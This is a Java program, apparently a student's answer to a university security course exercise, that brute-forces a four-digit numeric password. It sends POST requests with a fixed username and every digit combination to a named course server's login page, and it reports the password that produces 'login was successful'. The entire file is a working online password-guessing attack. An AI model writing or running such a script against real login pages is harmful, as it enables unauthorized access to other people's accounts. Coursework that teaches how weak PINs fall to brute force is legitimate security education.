import java.io.*;
import java.net.*;
import java.security.NoSuchAlgorithmException;
import java.util.*;
// ref: https://stackoverflow.com/questions/4205980/java-sending-http-parameters-via-post-method-easily
class SubmitPostForm {
    public static void main(String[] args) throws Exception {
        //character array of characters used in password
        char[] allowed = new char[]{'1','2','3','4','5','6','7','8','9','0'};
        //URL in which the form is contained
        URL url = new URL("https://cssrvlab01.utep.edu/Classes/cs5339/longpre/cs5352/loginScreen.php");

        //Size of password generated
        int k = 4;
        printAllKLength(allowed, k);
        
    }
    private static void sendRequest(URL url, String username, String password) throws Exception {
        Map<String, Object> params = new LinkedHashMap<>();
        params.put("un", username);
        params.put("pw", password);

        StringBuilder postData = new StringBuilder();
        for (Map.Entry<String,Object> param : params.entrySet()) {
            if (postData.length() != 0) postData.append('&');
            postData.append(URLEncoder.encode(param.getKey(), "UTF-8"));
            postData.append('=');
            postData.append(URLEncoder.encode(String.valueOf(param.getValue()), "UTF-8"));
        }
        byte[] postDataBytes = postData.toString().getBytes("UTF-8");

        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
        conn.setDoOutput(true);
        conn.getOutputStream().write(postDataBytes);

        Reader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));

        StringBuilder sb = new StringBuilder();
        for (int c; (c = in.read()) >= 0;)
            sb.append((char)c);
        String response = sb.toString();
        if(response.contains("login was successful")) {
            System.out.println(password + " was successful");
            return;
        }
        }

    static void printAllKLength(char[] set, int k) throws Exception {
        int n = set.length;
        printAllKLengthRec(set, "", n, k);
    }

    static void printAllKLengthRec(char[] set,
                                   String prefix,
                                   int n, int k) throws Exception {
        URL url = new URL("https://cssrvlab01.utep.edu/Classes/cs5339/longpre/cs5352/loginScreen.php");

        if (k == 0)
        {
            sendRequest(url, "jonathan5_-uLQ", prefix);
            return;
        }


        for (int i = 0; i < n; ++i)
        {

            String newPrefix = prefix + set[i];

            printAllKLengthRec(set, newPrefix,
                    n, k - 1);
        }
        return;
    }
}